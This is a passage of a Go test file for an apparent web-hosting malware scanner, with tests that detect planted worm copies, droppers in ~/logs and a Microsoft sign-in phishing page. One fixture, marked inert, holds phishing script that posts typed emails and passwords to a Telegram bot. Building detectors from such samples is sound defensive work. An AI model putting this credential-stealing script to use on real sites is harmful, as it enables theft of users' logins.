		"header input": "<?php\nheader( 'X: ' . $_SERVER['HTTP_X'] );\nreturn 'x';\n",
	} {
		if d := s.checkContent(p, extOf(p), []byte(body)); d == nil {
			t.Errorf("%s: no finding", what)
		}
	}
}

// s1 (2026-11-06): a self-healing SEO kit kept its droppers in ~/logs
// (cache_gc.php, run by cron every minute in 8 accounts) and a worm kept
// copies named .<40 hex> in the home folder and ~/.cache. Scans skipped
// ~/logs and the worm's copy in the home folder had no finding, so the
// cron monitor never switched their jobs off while the kit rewrote its
// pages 4,200 times. Inert fixtures.
func TestFleetSelfHealingKitHomes(t *testing.T) {
	s := newScanner(t)
	worm := "<?php class _cqp{private static $_yn;public static function _uzg($a){return $a;}} // inert fixture\n"
	for what, c := range map[string]struct{ path, body, sig string }{
		"worm in home":    {"/home/kiccom/.068e9e7e23b9443901c35da3e0603ed5609de66aa", worm, "PHP.Planted.HiddenRandomName"},
		"worm in cache":   {"/home/kiccom/.cache/.0dbc978a69b0f615a40a06e5cbbef14214d3c052a", worm, "PHP.Planted.HiddenRandomName"},
		"dropper in logs": {"/home/vertixsol/logs/cache_gc.php", "<?php // inert fixture\n$f = 'index.php';\n", "PHP.Planted.InLogsFolder"},
		"stash in logs":   {"/home/vertixsol/logs/customerp.example.test/index.php", "<?php // inert fixture\n", "PHP.Planted.InLogsFolder"},
	} {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.body)); d == nil || d.Signature != c.sig || d.Category != CatVirus {
			t.Errorf("%s: %+v", what, d)
		}
	}
	// A hex-named cache entry that is not PHP, and a hex-named file
	// outside the accounts.
	for what, c := range map[string]struct{ path, body string }{
		"binary cache":  {"/home/u/.cache/.0123456789abcdef0123456789abcdef", "\x00\x01\x02 serialized"},
		"json cache":    {"/home/u/.cache/.fedcba9876543210fedcba9876543210", `{"a":1}`},
		"text with tag": {"/home/u/.cache/.fedcba9876543210fedcba9876543211", "notes about <?php tags"},
	} {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.body)); d != nil {
			t.Errorf("%s: %+v", what, d)
		}
	}
	// Scans now reach the scripts in ~/logs (the logs themselves are not
	// read).
	root := writeTree(t, map[string]string{
		"logs/cache_gc.php":                   malicious["eval.php"],
		"logs/customerp.example.test/abc.php": malicious["eval.php"],
		"logs/example.test-Nov-2026.gz":       "\x1f\x8b binary",
		"public_html/index.php":               "<?php echo 'hello';",
	})
	var hits []string
	_, err := s.scanTree(context.Background(), []string{root}, time.Time{}, 0, s.Settings.Get().Scanner, treeHooks{
		hit: func(path string, _ fs.FileInfo, _ Detection) { hits = append(hits, path) },
	})
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(hits)
	if len(hits) != 2 || !strings.HasSuffix(hits[0], "/logs/cache_gc.php") || !strings.HasSuffix(hits[1], "/logs/customerp.example.test/abc.php") {
		t.Fatalf("hits %v, want the two scripts in ~/logs", hits)
	}
}

// business200 (glasgowfitness.com, 2026-11-06): a Microsoft sign-in copy
// in wp-content/maintenance/assets/HOT2.htm (beside WP Toolkit's own
// maintenance page) sent the address and two passwords from the browser
// to a Telegram bot; no form, no PHP, and the clone rule did not see it.
// Inert fixture (made-up token); WP Toolkit's page and look-alikes stay
// clean.
func TestFleetClientSideTelegramPhish(t *testing.T) {
	s := newScanner(t)
	kit := "<!DOCTYPE html><html><head><title>Sign in to your Microsoft account</title></head><body>\n" +
		"<input type=\"text\" id=\"emailInput\"><input type=\"password\" id=\"passwordInput\"><button id=\"next\">Next</button>\n" +
		"<script>\nconst accounts=[{token:'0000000000:inert-fixture',chatId:'1'}];\n" +
		"function send(e,p){fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{\n" +
		"accounts.map(a=>fetch(`https://api.telegram.org/bot${a.token}/sendMessage`,{method:'POST',body:JSON.stringify({chat_id:a.chatId,text:e+' '+p+' '+d.ip})}));\n" +
		"window.location.href='https://login.live.com';});}\n" +
		"document.getElementById('next').addEventListener('click',()=>send(document.getElementById('emailInput').value,document.getElementById('passwordInput').value));\n</script></body></html>\n"
	for _, p := range []string{"/home/u/public_html/wp-content/maintenance/assets/HOT2.htm", "/home/u/public_html/office/index.html"} {
		if d := s.checkContent(p, extOf(p), []byte(kit)); d == nil || d.Signature != "Phishing.Credentials.TelegramExfil" || d.Category != CatVirus {
			t.Errorf("%s: %+v", p, d)
		}
	}
	for what, body := range map[string]string{
		// WP Toolkit's maintenance page.
		"wp toolkit": "<!DOCTYPE html><html><head><title><?php echo $texts['title']; ?></title><script src=\"<?php echo $assetsUrl; ?>timer.js\"></script></head><body><h1><?php echo $texts['header']; ?></h1></body></html>\n",
		// An order form sent to the shop's Telegram, no password.
		"order form": "<html><body><input name=\"phone\"><script>fetch('https://api.telegram.org/bot0000:inert/sendMessage',{method:'POST',body:JSON.stringify({chat_id:1,text:document.querySelector('[name=phone]').value})});</script></body></html>\n",
		// A login page that posts to its own server and links Telegram.
		"own login": "<html><head><title>Members</title></head><body><form method=\"post\" action=\"/login\"><input type=\"password\" name=\"pwd\"></form><a href=\"https://t.me/ourchannel\">Telegram</a><script>fetch('/api/news')</script></body></html>\n",
	} {
		p := "/home/u/public_html/page.html"
		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
			t.Errorf("%s: %+v", what, d)
		}
	}
}
